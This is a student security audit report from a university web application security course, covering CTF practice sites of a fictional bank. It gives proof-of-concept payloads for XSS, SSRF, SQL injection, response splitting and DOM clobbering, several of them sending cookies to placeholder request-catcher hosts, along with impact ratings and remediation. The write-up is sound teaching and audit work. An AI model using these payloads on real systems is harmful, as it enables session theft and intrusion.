---
title: "Report - Week 7-10"
date: 2020-08-09T23:59:59+10:00

categories: ["Report"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

# COMP6443 20T2 - Web Application Security

![](../report1/image3.png)

**-QBSITE- Security Audit**

<table>
  <tr>
   <td>
Usman Haidar
   </td>
   <td>
Aaron Min
   </td>
   <td>
Sean Smith
   </td>
   <td>
Andrew Wong
   </td>
   <td>Jennifer Xu
   </td>
  </tr>
</table>

<br/><br/><br/><br/><br/>

## Vulnerability Classifications 

<table>
  <tr>
   <td><strong>CRITICAL </strong>
<p>
Vulnerabilities which result in access to critically sensitive data, system control, unauthorised admin privilege and bypass of server logic
<p>
<em>e.g. Server security misconfigurations, Server Side Injection, Sensitive Data Exposure</em>
   </td>
  </tr>
  <tr>
   <td><strong>HIGH</strong>
<p>
Vulnerabilities which affect the <span style="text-decoration:underline;">security</span> of the platform, leading to unauthorised account control
<p>
<em>e.g. Cross Site Scripting, DOM Clobbering, Response Splitting</em>
   </td>
  </tr>
  <tr>
   <td><strong>MEDIUM </strong>
<p>
Vulnerabilities which affect the <span style="text-decoration:underline;">privacy</span> of the platform, leading to unauthorised access to data
<p>
<em>e.g. WAF Bypass, Security Misconfigurations</em>
   </td>
  </tr>
  <tr>
   <td><strong>LOW </strong>
<p>
Vulnerabilities which grant knowledge of restricted resources
<p>
<em>e.g. Reflected Cross Site Scripting, Stored Cross Site Scripting</em>
   </td>
  </tr>
</table>


## Immediate Critical Vulnerabilities To Address


The following websites have critically classified vulnerabilities that should immediately be addressed. These vulnerabilities can lead to a breach of critical data, and total control of the system.


<table>
  <tr>
   <td>
<p style="text-align: right">
ctfproxy2.-QBSITE-</p>

   </td>
   <td>
Unauthorised access to internal resources on QuoccaBank network
   </td>
  </tr>
  <tr>
   <td>
<p style="text-align: right">
pay-portal-v2.-QBSITE-</p>

   </td>
   <td>
Leakage of Employee Payroll Data
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


## Site Assessment

### Security Misconfiguration

#### Input Data Type Validation

**Vulnerability Details**

When using data provided by the user, the input should always be validated - as there is no guarantee that the user input is valid and correct. If a function does not safely handle or validate user data, it may either crash the service, or allow the data to be used unsafely.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

*   sturec.-QBSITE-

The `dcreat` form field contains the timestamp that the POST request from `/user-create`  was made. There is a regular expression sanitiser `/<(?:\w+)\W+?[\w]/g` that is applied on this value, however it is not holistic and can be bypassed by appending "`<_<_`" after an opening tag's ``<`` character.

```
# Before
<script>alert('pwn!')</script>

# After
<<_<_script>alert('pwn!')</script>
```

1. Submit a student record POST request with a modified `dcreat` value

```
<<_<_script>alert('pwn!')</script>
```

_Note that this `dcreat` value is not a timestamp, as intended to be_

2. View the main page to execute the `dcreat` payload

**Impact**

**High Impact**

The lack of input type validation allows injection of arbitrary values, which can lead to XSS vulnerabilities.

**Remediation**

*   Generation of the `dcreat` timestamp should not be performed client-side, but on the server
*   The value of `dcreat` should be type validated to ensure that is a valid timestamp
*   The value of `dcreat` should be verified that the submitted timestamp is relatively real-time

**References**

[https://featherbear.cc/UNSW-COMP6443/post/course-ctf/week7/#aside-dcreat](https://featherbear.cc/UNSW-COMP6443/post/course-ctf/week7/#aside-dcreat)


#### API Server Key Verification

**Vulnerability Details**

To enforce a specific method of access to a service (i.e. through a reverse proxy with a WAF), a shared secret can be implemented between the infrastructure and the service. Only requests that contain the shared secret will be handled by the service. This protection relies on the secrecy of the token, and the correct server side verification of the token. If not properly implemented, the service will be accessible through other means

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

* flagprinter.-QBSITE-

1. Register an endpoint `flagprinter-bypass` that points to `flagprinter.-QBSITE-`
2. Enable the new endpoint at `ctfproxy2.-QBSITE-/enable/flagprinter-bypass`  
3. Access the endpoint at `ctfproxy2.-QBSITE-/api/flagprinter-bypass`  

**Impact**

**Medium Impact**

By creating an alternative endpoint to the same internal URL, the lack of shared secret verification allows access to the supposed disabled service. This can pose a security risk to QuoccaBank, as the vulnerabilities in the service are now exposed to the public

**Remediation**

* Enforce shared secret validation on the `flagprinter` service to prevent access from other endpoints

#### Internal IP Address Leak

**Vulnerability Details**

Devices within the same local network are able to communicate to each other through an internal/local address (i.e LAN IP address). Whilst an external device cannot access another device through its local address, it may become valuable information if an attacker gains access to an internal device.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

* ctfproxy2.-QBSITE-

On the `/me` page, request an avatar update with the address `http://<YOUR_TARGET_HOST>#.png` where <`YOUR_TARGET_HOST`> is replaced with a hostname of a device in the local network.

These hostnames are the subdomain names of the -QBSITE- services.  
i.e. The container serving the contents of `ctfproxy2`.-QBSITE- has a hostname of `ctfproxy2`  
i.e. The container serving the contents of `requestz`.-QBSITE- has a hostname of `requests`  
i.e. The container serving the contents of `whoami`.-QBSITE- has a hostname of `whoami`  

This will raise an error containing the internal IP address of the local devices/containers.

Example IP address leaks:

* `flagprinter` - 10.152.183.59
* `science-tomorrow` - 10.152.183.49
* `science-today` - 10.152.183.36

**Impact**

**Low Impact**

Exposure of an internal IP address alone does not purport any risk, unless there is another service within the local network, whose behaviour is influenced by user interaction.

**Remediation**

Reducing the verbosity of error messages will prevent the disclosure of internal addresses to the end user.

### SQL Injection

**Vulnerability Details**

SQL injection is a code injection technique that allows the attacker to take over the queries that an application makes to its database. This may allow an attacker to read sensitive data from the database, modify database data, execute administration operations on the database, recover the content of a given file present on the server and even issue commands to the OS.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

*   pay-portal-v2.-QBSITE-


1. Inject the below payload into the search box

```
"OR(1);
```

(WAF bypass applied)

2. The initially hidden entries are revealed. An excerpt is shown below:

**Impact**

**Critical Impact**

By gaining control of the SQL query, attackers are able to leak sensitive data stored in a database. Inside the `pay-portal-v2` site, SQL injection will lead to the leakage of confidential payroll information of the company's employees.

**Remediation**

* Parameterised queries (if implemented properly) will prevent the string escaping of user-fed input.
* Grant only the minimum required privileges to the service SQL account
* Perform input validation / whitelist of queries

### HTTP Response Splitting

**Vulnerability Details**

Response splitting occurs when a HTTP response header is split into two pieces as a result of injecting an unsanitized "`\r\n\r\n`"  sequence. This causes the latter half of the response to be parsed as part of the body content, possibly leaking header data into the web page.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable 

* report.-QBSITE- 

1. Access `report.-QBSITE-/robots.txt` to reveal a resource <code>/view<em> </em></code>  
2. Post the following payload to the <code>/response</code> endpoint.

```
\r\n\r\n <img on=alert(1) onerror=fetch('{REQUST_CATCHER}' +/flag=.+?;/.exec(document.body.innerHTML)[0]) src=a>
```

3. Decode the cookie when posting to the<code> /report</code> endpoint to find a base64 encoded md5 hash  
4. Use the md5 hash as an endpoint <code>( /view/{md5 HASH} )</code>to view the contents of our report, now gaining access to the cookie.  

**Impact**

**High Impact**

Although gaining access to reports submitted by employees may not result in an immediate financial loss, there is a breach of privacy, leading to unauthorised access to sensitive data on Quoccabank employees. Quoccabank could potentially lose valuable employees if valid reports are modified or deleted by a third party. Furthermore, sensitive data pertaining to employees can potentially be utilised as recon to aid an attack from another field.

**Remediation**

1. Blacklisting should be written on the server side and not allowed to be seen by attackers  
2. Better blacklisting technique which looks for **all** cases of blacklisted words (the current blacklist only finds and removes the first instance)  
3. Properly sanitise for "\r" and "\n" values to prevent response splitting  
4. CSP should also be defined within the HTML

### XSS

---

Cross-Site Scripting attacks inject malicious scripts into websites. Typically, these malicious scripts are sent in the form of a browser side script to a different end user and can occur without the end user being aware. 

---

#### Stored XSS (I) : SVG Injection

**Vulnerability Details**

Scalable Vector Graphics is an XML-based vector image format for 2D graphics with support for interactivity and animation. This means that SVG files can also include embedded JavaScript code.

However, attackers can exploit the execution of embedded JavaScript to perform XSS exploits, potentially accessing sensitive data or authorisation tokens, allowing an attacker to escalate their privileges or use confidential data against Quoccabank.  

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

* profile.-QBSITE- 

1. Create an SVG file which requests for the cookie onload 

```
<svg>
  <script>
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "<endpoint>" + document.cookie, false );
    xmlHttp.send( null );
  </script>
</svg>
```

2. Upload the SVG file  
3. Intercept the request which gets sent when clicking "Report this profile to Admin."  
4. Change the request parameter for "path" from `/profile` to `/profileimage?1596775688`  
5. Attacker now has access to admin cookies  

**Impact**

**High Impact**

Leaking cookies escalates an attackers privileges to administrator level. This potentially means breach of privacy, allowing attackers to view other profiles, even worse, modification and/or deletion of database records. This could potentially cause huge disruptions within Quoccabank and lead to hours wasted on updating databases and records. Even worse, it could potentially allow attackers to escalate their privileges on other subdomains within Quoccabank.

**Remediation**

1. Path in which to direct the client should not be dictated on the client side.  
SVG scripts do not run when referenced within image tags, however directing the admin to open the svg file itself causes it to be vulnerable. [1]  
2. Use HTTPS to ensure that web browsers do not allow any requests or access to cookies being stored.  
3. Sanitise SVG files using libraries such as _svg-sanitizer _[2]  
4. Convert the SVG to another format server-side (such as PNG)   

**References**

[1] [https://www.w3.org/wiki/SVG_Security](https://www.w3.org/wiki/SVG_Security)

[2] [https://github.com/darylldoyle/svg-sanitizer](https://github.com/darylldoyle/svg-sanitizer)

#### Stored XSS (II) : Direct Script Injection

**Vulnerability Details**

A stored XSS attack is a type of cross site scripting whereby the malicious script is directly injected into a web application. The script that is injected, is stored by the target application, for example within a comments section, database, log, files, etc [1]

The user inadvertently runs the malicious script by requesting the stored information. For example when a user visits a comments section that has a malicious script stored on it, he/she will have run that script everytime the page has loaded.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable:

* science-today.-QBSITE-

1. In the comments section type in: `<SCRIPT>alert(1)</SCRIPT>` and submit the comment.  
2. Reload the page multiple times and notice that an alert shows up after each reload. This indicates that the web page is including scripts as part of it’s html and the script is being executed every time the page is visited.

* science-tomorrow.-QBSITE-

Carrying out the same steps as above will trigger "HackShield" i.e. the Web Application Firewall (WAF) thus limiting the scope of xss that can be carried out on the science-tomorrow site. However the site is still vulnerable to stored xss despite the protective measures:

*   In the comments section type `<b>test</b>` and submit comment. Notice that the comment remains in bold every time the page is visited.
*   In the comments section type: 

```
<img src="x" onerror="eval('al'+'ert(1)')"> 
```

Notice that the HackShield that was blocking all alerts can now be bypassed. An alert will now display whenever the page is visited.


It is important to note that both of the sites are susceptible to cookie stealing via the stored XSS vulnerability. Steps to attain the admin’s session cookie are as follows:



1. Visit [https://science-today.-QBSITE-](https://science-today.-QBSITE-) and navigate to the comments section.  
2. Set up a request endpoint (via [requestbin.net/](http://requestbin.net/) or otherwise) to capture and inspect requests.  
3. Inject the following malicious script into the comments section and submit:   

```
<img src="x" onerror=window.location="{REQUEST_ENDPOINT}/q?="+document.cookie >
```

4. Turn on Burp Suite to intercept the request to stop page redirecting to the request endpoint. Navigate to the main comments page by forwarding requests appropriately.
5. Once on the main comments page, click "report this page to admin" and forward the request on Burp Suite.
6. Notice the admin’s session cookie now appears at the request endpoint.

**Impact**

**Low Impact**

The impact of stored XSS vulnerability on the science-tomorrow and science-today sites can be rated as 'low.’ To determine this impact rating the "nature of the application, its functionality and data"[2] have to be taken into consideration.  \
Considering that on science-today/science-tomorrow sites all users are anonymous and all information is public, the impact of an XSS attack is minimal [2].

The most serious consequence of a stored XSS attack on the _science-today/science-tomorrow _sites is the attainment of the admin’s session cookie. However, despite having this cookie, there is no further data that can be obtained from the_ science-today/science-tomorrow _sites.  Furthermore, the admin’s session cookie on each site is restricted to their respective subdomains and does not compromise any other part of the system. 

From a financial perspective, the_ science-today/science-tomorrow _sites do not contain any sensitive data (financial or otherwise) that can be obtained. Hence, the financial impact of the stored XSS vulnerability can also be considered as 'low.’

It is important to note however, that on many websites stealing session cookies are 'high’ to 'critical’ impact vulnerabilities. Stealing a user session cookie would allow attackers to impersonate legitimate users and access sensitive information (such as banking details). Obtaining an admin’s session cookie could allow an attacker to gain full control of an application. An admin cookie may not be limited to a single subdomain (as is the case for our sites) and could apply throughout the whole domain thus giving attackers full control of the system.

**Remediation**

*   **Filter content on arrival**: Both sites allow special characters to be submitted as comments. To minimise the risk of XSS a whitelist should be used to allow only known good characters. 
*   **Encode/Escape data on output:** HTTP response output should be encoded to avoid being treated as html/javascript. Encoding should make sure to escape all dynamic content. 

*   **Utilising appropriate headers:** Setting the appropriate cookies can help with limiting cookie stealing that occurs via XSS. If the  "Set-cookie: httponly" is set, client side script code that attempts to read the cookie, he/she will receive an empty string [3]. Thus, cookie stealing (via stored xss or otherwise) will fail as cookies cannot be read, thus making it much more difficult for said cookies to be stolen.
*   **Content Security Policy (CSP):** Setting a CSP can be used to stop browsers from executing inline JavaScript code thus thwarting most XSS attacks [4].

**References**

[1] [https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/](https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/)  
[2] [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)   
[3] [https://owasp.org/www-community/HttpOnly](https://owasp.org/www-community/HttpOnly)  
[4] [https://www.hacksplaining.com/prevention/xss-stored](https://www.hacksplaining.com/prevention/xss-stored)

#### Reflected XSS

**Vulnerability Details**

A reflected XSS vulnerability is a vulnerability whereby scripts are reflected off a webserver in the form of an "error message, search result, or any other response that includes some or all of the input sent to the server as part of the request"[1].  

Reflected XSS usually involves tricking a user to click a malicious link or submit a faulty form. The injected code travels to the vulnerable website and is then "reflected" back to the user’s browser. The user’s browser interprets the malicious code as legitimate web page code and executes it. The full reflected XSS workflow is highlighted below[2]:

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable:

* science-today.-QBSITE-

1. Set up a request endpoint to capture and inspect requests.  
2. Insert the following payload into the filter query   

```
<script/>fetch('{REQUEST_ENDPOINT}?x=' + document.cookie);</script/>
```

3. Click "Filter Comments"  
4. Click "Report to Admin"  
5. The admin’s session cookie will now be visible at the request endpoint

* science-tomorrow.-QBSITE-

1. Input the following payload into the filter comments search query (WAF Bypassed): 

```
<imIMGg src=x onONERRORerror=this.src="{REQUEST_ENDPOINT}?c="+document.cookie>
```

2. Click "Report to Admin"  
3. The admin’s session cookie will now be visible at the request endpoint  

**Impact**

**Low Impact**

The impact rating of the reflected XSS vulnerability on the science sites is a 'low’ impact rating.

Considering the nature of the site (public website with anonymous users) the impact of a reflected XSS attack is minimal. The attackers cannot gain any sensitive information due to the absence of such data on the page.

As with the stored XSS vulnerability on the two science sites (see Stored XSS - Direct Script Injection) the business impact is minimal.

**Remediation**



*   **Sanitize input:** encode unsafe characters in the response. The encoding should follow the encoding scheme outlined in the "Stored XSS - Direct Script Injection" analysis.
*   **Utilise appropriate headers:** Utilise the HTTP X-XSS-Protection response header. This header will stop a page from loading if reflected cross site scripting is detected. In the case of science-today/tomorrow the X-XSS-Protection header is set to 0 (i.e it is disabled for XSS filtering) when requests are made to the "filter comments" endpoint.

**References**

[1] [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/) \
[2] [https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b06c3e8d638a](https://medium.com/iocscan/reflected-cross-site-scripting-r-xss-b06c3e8d638a)


#### JSONP XSS

**Vulnerability Details**

JSONP (JSON with Padding) is used to grant cross-origin read access to JavaScript and acts as an exception to the Same Origin Policy [1]. It allows for cross-origin data access by utilising a callback to move the data. Although it is convenient, it has serious security flaws.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

* sturec.-QBSITE-

**Stored XSS Method**

1. Utilise the JSONP link at 

```
https://sturec.-QBSITE-/students.jsonp?q=x&callback=render
```


(can be found by viewing the page source when any 'last name’ is queried at `https://sturec.-QBSITE-/?q={query})`

2. Inject a payload into the JSONP link by replacing 'render’
    * **Initial Payload**
    `<script src ='/students.jsonp?q=x&callback=window["location"]["assign"](["<Malicious Link>"]+self["document"]["cookie"])'></script>`

    The '&’ needs to be URL encoded once and the '+’ symbol needs to URL encoded twice for the Payload to work

    * **Intermittent Payload**:
    `<script src ='/students.jsonp?q=x%26callback=window["location"]["assign"](["<Malicious Link>"]%252bself["document"]["cookie"])'></script>`

    As the '.’ symbol results in an 'illegal callback’, escaped hex encoding or base64 encoding can be used to bypass restrictions for domains


    E.g. `www.example.com/ = \x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f`

    * **Intermittent Payload**
    
    `<script src ='/students.jsonp?q=x%26callback=window["location"]["assign"](["\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f"]%252bself["document"]["cookie"])'></script>`

    (WAF Bypass Employed)

    *   **Final Payload**

    `<<x xscript src ='/students.jsonp?q=x%26callback=window["location"]["assign"](["\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f"]%252bself["document"]["cookie"])'></script>`

3. Use the Student Creation Form to create an account and intercept the request before sending
   
4. Replace the **dcreat **field with the **Payload **and create a new user
5. The injected payload will now cause the main page to redirect to the malicious link with the user’s cookie. By reporting the page to the admin, their cookie can also be leaked

**Reflected XSS Method**

1. Similar to the Stored XSS Method, the JSONP link can be utilised. For this attack, there can be a disregard for any WAF script tag filtering, the '&’ symbol can be left as is and the '+’ needs to be only URL encoded once.  
2. A malicious payload can then be inputted in the 'last name’ search bar such as:
    * **Payload**
    `<script src ='/students.jsonp?q=x&callback=window["location"]["assign"](["\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f"]%2Bself["document"]["cookie"])'></script>`

3. The injected payload will now cause the search queried page to redirect to the malicious link with the user’s cookie. By reporting the search queried page to the admin, their cookie can also be leaked

**Impact**

**Medium Impact**

The impact of stored XSS and reflected XSS through the use of JSONP for the Student Records site can be rated as 'medium’. This rating is determined by the public access to created Student Records and the ability to search for any based on their last name. As all Student Record information is public, the extent of an XSS attack is minimal due to the inability to steal any other hidden information.

The worst of an applicable JSONP XSS attack can be noted down as the stealing of the administrator's session cookie. Despite retrieving this cookie on the Student Records site, there is no further data that can be ascertained. Furthermore the cookie from this site does not impact any other QuoccaBank subdomains. Care still needs to be given as for some situations, the administrator’s cookie can lead to privilege escalation and further control of the overall website.

From a business perspective, the Student Records site already contains publicly viewable sensitive data, where there is a disregard for restrictive access. Any user is allowed to create a Student Record, which should be restricted to privilege staff members only. There is also a scenario where an attacker could disrupt the main page due to using potential redirect attacks, disallowing any user from either viewing or adding Student Records. This could potentially stall new student operations until the issue is remedied.

**Remediation**

JSONP is viewed as an obsolete practice in web applications and should not be used at all. The modern and widely supported alternative is CORS (Cross-Origin Resource Sharing) [2]. This alleviates the need to wrap the JSON in a callback function, where instead an "Access-Control-Allow-Origin" header can be used instead to tell the browser which origins need to be granted access.

If JSONP is a vital requirement of the web application, further care needs to be given to sanitize the callback parameter. For instance, the callback name could be restricted to certain keywords as well as adding a disallowance of any non-alphanumeric from returning within the response.

**References**

[1] [https://medium.com/bugbountywriteup/exploiting-jsonp-and-bypassing-referer-check-2d6e40dfa24](https://medium.com/bugbountywriteup/exploiting-jsonp-and-bypassing-referer-check-2d6e40dfa24)

[2] [https://security.stackexchange.com/questions/169816/how-to-prevent-jsonp-injection](https://security.stackexchange.com/questions/169816/how-to-prevent-jsonp-injection)


### DOM Clobbering & CSP Bypass

**Vulnerability Details**

DOM Clobbering is an injection technique where the intended behaviour of a page's JavaScript code is subverted as a result of mismatched object references in the DOM. This can lead to unforeseen code execution.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

* support-v2.-QBSITE-

Create a ticket with the below payload content

**Title**

```
<iframe id=tk></iframe><script>
```

**Body**

```
<form id=rp>
  <input name=ownerDocument>
  <script>alert('pwn!')</script>
```


This will create a new ticket page where the title has been unsafely injected into the page. As a result, the unclosed `<script>` tag inside the title prevents the DOMPurify library from loading, allowing the body payload to be loaded unsafely into the `iframe`.

By creating a `<form>` with the id as `rp`, the Javascript code unintentionally selects the injected code in the `iframe`, where the `ownerDocument` property resolves to an element that is not the parent of the `rp` element. This causes the `isAttached` check in the jQuery library to return `false`, which causes the `script` tag to be injected with relevant CSP `nonce` values.

**Impact**

**High Impact**

DOM clobbering has the potential to nullify and override the execution of crucial scripts that exist in a website. In the case of `support-v2`, DOM clobbering leads to the disablement of the DOMPurify, which consequently makes XSS. 

If an administrator opens this infected ticket, malicious Javascript will be executed under the administrator's credentials - leading to session theft, or further CSRF.

**Remediation**

The server should sanitise the ticket title before it is inserted into the webpage. This will prevent the DOMPurify library from being nullified, mitigating the XSS payload in the body

**References**

[https://featherbear.cc/UNSW-COMP6443/post/course-ctf/week7/#support-v2](https://featherbear.cc/UNSW-COMP6443/post/course-ctf/week7/#support-v2)


### Server Side Request Forgery

**Vulnerability Details**

Server-side request forgery vulnerabilities arise from server functions that communicate to and from arbitrary addresses supplied by the user. As requests to these addresses originate from the server machine, it is possible to access internal devices in the same network.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

*   ctfproxy2.-QBSITE-

Inspecting the source code in the `/me`, the operation of the internal WAF is made known.

*   URL must ends with `.png`
*   URL must not contain specific keywords
*   Hostname (regex matched) must not be resolved to a private address

These criteria can be bypassed by using a payload such as the following

```
https://google.com@TARGET/PATH#.png
```

In appending the page anchor `#.png`, the WAF condition is satisfied without affecting the result request. Due to a flaw in the regular expression `https?://([a-zA-Z0-9-_.]+)`, the captured hostname can be redirected to a public hostname, whilst the actual URL still contains an internal/private hostname.

By making an avatar request to `http://ctfproxy2#.png`, the internal IP address of `ctfproxy2` - 10.152.183.121 will be leaked. This allows an attacker to bypass the keyword filter which prevents orthodox methods of accessing localhost addresses (i.e. `127.0.0.1`).

By using the WAF bypass payload `http://google.com@10.152.183.121/flag#.png`, a request to a restricted internal resource is granted - storing the contents of the resource inside `avatar.png `from which data can be exfiltrated from.

**Impact**

**Critical Impact**

A lack of sufficient URL and response type validation makes `ctfproxy2` vulnerable to SSRF exploits - where requests can be made arbitrarily to any address, regardless of the resource type. An attacker can exploit this vulnerability to access confidential internal resources and documents that exist within the Quoccabank network. Furthermore, malicious requests to other resources on the internet can be performed from a Quoccabank address origin - leading to possible DDoS or other fraudulent activity.

**Remediation**

*  Ensure the fetched resource is a valid image file. This will prevent non-image resources from being accessed
*  Implement a better regex match _i.e._ `https?://.+?@?([a-zA-Z0-9-_.]+)` which will mitigate the private IP checking vulnerability
*  Removing verbose error messages prevents the internal address of `ctfproxy2` from being revealed - _see Security Misconfiguration :: Internal IP Address Leak_

**References**

[https://featherbear.cc/UNSW-COMP6443/post/course-ctf/week9/#ctfproxy2-ssrf](https://featherbear.cc/UNSW-COMP6443/post/course-ctf/week9/#ctfproxy2-ssrf)

### Web Application Firewall Bypass

#### Input Sanitisation

**Vulnerability Details**

To mitigate inline command substitution and string escaping vectors, applications might strip away string quotation characters and other "escape" characters such as (`\`, `\\`, `'`, `"`, `$`). However if not performed correctly, and holistically; input sanitisation can be circumvented.

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable

* science-today.-QBSITE-
* science-tomorrow.-QBSITE-

The above sites have the keywords '`img`’, '`<script>`’ and '`onerror`’ being put on a blacklist, which are removed during the sanitisation process, preventing attackers from directly injecting scripts into the website.

1. By injecting "`<script>alert(1)</script>`", there will be an output saying

> Showing comments containing "`alert(1)`", demonstrating that `<script>` has been filtered out.

2. This can be bypassed by injecting "`<SCR<script>IPT>alert(1)</SCR</script>IPT>"`, which will raise an alert when the comment is filtered.

3. An XSS attack can be cast using the following string:

```
<IMimgG src="x" ONEonerrorRROR=window.location="{RequestCatcher}//q?="+document.cookie>
```

4. After reporting the page to the admin, access to the admin’s cookie from the request catcher can be obtained.

**Impact**

**Medium Impact**

By passing input sanitisation, an attacker is allowed to gain control over query strings, which allows other exploits to be used, which in this case is XSS.

**Remediation**

* Ensure input sanitisation is performed during all stages of string insertion and concatenation
* Use secure string replacement strategies

#### Keyword Filtering

**Vulnerability Details**

In an attempt to mitigate common attack vectors, application firewalls may implement a keyword blacklist - which will abort the operation and throw an error if the blacklist detects a match in the request. However, a blacklist can only prevent attacks that have been listed/hardcoded. Security concerns arise if the blacklist is inconclusive, or fails to detect dynamically formed payloads (i.e. string concatenation)

**Proof of Concept / Steps to Reproduce**

The following sites are vulnerable:

* pay-portal-v2.-QBSITE-


1. When injecting an SQL injection query: `' or 1='1; `in the search tab, HackShield will be activated, giving an attacker information that the string has been black listed.  
2. By trying out `', or, 1='1;` individually, it shows that none of the parts has been black listed by itself. Hence, the whole string has been blacklisted.  
3. To bypass the filtration using `' OR(1);,` which will show all the hidden entries in the table

* science-tomorrow.-QBSITE-

1. Similar to pay portal, when the following: `<script>alert(1)</script>` is submitted into in the filter comments box, where the error, "You are a hacker" will be shown, and HackShield will be activated  
2. However, this can be bypassed by injecting 

```
<img src="x" onerror="eval('al'+'ert(1)')"> 
```

Which will trigger an alert after refreshing the page. From this, it can be realised that "img" was not filtered out.

**Comments field**

```
<img src="x" onerror=window.location="https://{RequestCatcher}//q?="+document.cookie>
```

**Filter Field**
```
<IMimgG src="x" ONERonerrorROR=window.location="{Request_Endpoint}/q?="+document.cookie>
```

**Impact**

**Medium Impact**

Bypassing keyword filtering can lead to security concerns such as enabling an attacker to gain control over the query, allowing them to inject malicious query, which in this case, XSS can be used to get access to the admin’s cookie.

**Remediation**

* Disable processing of external entities
* Compare the output/result data against the blacklist. Whilst this may not prevent RCE and other attacks, it will mitigate the ease of data leaking.
